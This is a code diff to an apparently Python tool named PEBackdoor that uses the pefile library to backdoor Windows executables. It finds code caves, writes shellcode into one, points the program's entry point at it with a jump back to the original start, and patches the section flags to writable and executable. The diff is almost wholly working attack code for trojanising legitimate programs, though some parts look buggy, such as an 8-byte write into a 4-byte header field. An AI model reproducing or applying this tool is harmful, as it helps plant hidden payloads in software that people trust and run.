@@ -52,7 +52,8 @@ def code_caves(min_size, pe_path):
             pos += 1
     caves.sort(reverse=True)
     return caves
-
+def align(val_to_align, alignment):
+    return ((val_to_align + alignment - 1) / alignment) * alignment
 #gives info about specified PE file
 def info(file_name):
     pe_path = file_name
@@ -74,6 +75,20 @@ def write_shellcode(pe, offset, shellcode):
     print("writing shellcode")
     pe.set_bytes_at_offset(offset, shellcode)
 
+def make_section_executable(section, out_path):
+    #TODO: see if this is the best characteristic for this program.
+    # CODE | EXECUTE | READ | WRITE
+    characteristics = 0xE0000020 
+
+    section_offset = section.get_file_offset()
+    print(f"section characteristics {hex(section_offset + 36)}")
+
+    print(f"out path {out_path}")
+
+    with open(out_path, "r+b") as f:
+        f.seek(section_offset + 36)
+        f.write(characteristics.to_bytes(8, 'little'))
+    
 
 
 
@@ -105,23 +120,20 @@ def PEBackdoor(pe_path, shellcode, output, interactive = False):
     print("main function called")
     pe = pefile.PE(pe_path)
     original_start = pe.OPTIONAL_HEADER.AddressOfEntryPoint
-    print(hex(original_start))
+    print(f"Original Starting Location: {hex(original_start)}")
     new_shellcode = append_jump(pe_path, '', '', original_start)
-    print(new_shellcode)
-    pe.close()
+    print(f"Jump instruction back to start {new_shellcode}")
     caves = code_caves(150, pe_path)
-    for cave in caves:
-        cave.print_cave()
 
-
-    print(hex(caves[3].location))
-    pe = pefile.PE(pe_path)
+    
+    #Write shellcode and set start location.
     write_shellcode(pe,caves[3].location,new_shellcode)
     pe.OPTIONAL_HEADER.AddressOfEntryPoint = caves[3].virtual_location
     caves[3].print_cave()
     pe.write(output)
-
-
+    pe.close()
+    make_section_executable(caves[3].section, output)
+    
 
 if __name__ == "__main__":
     interactive()
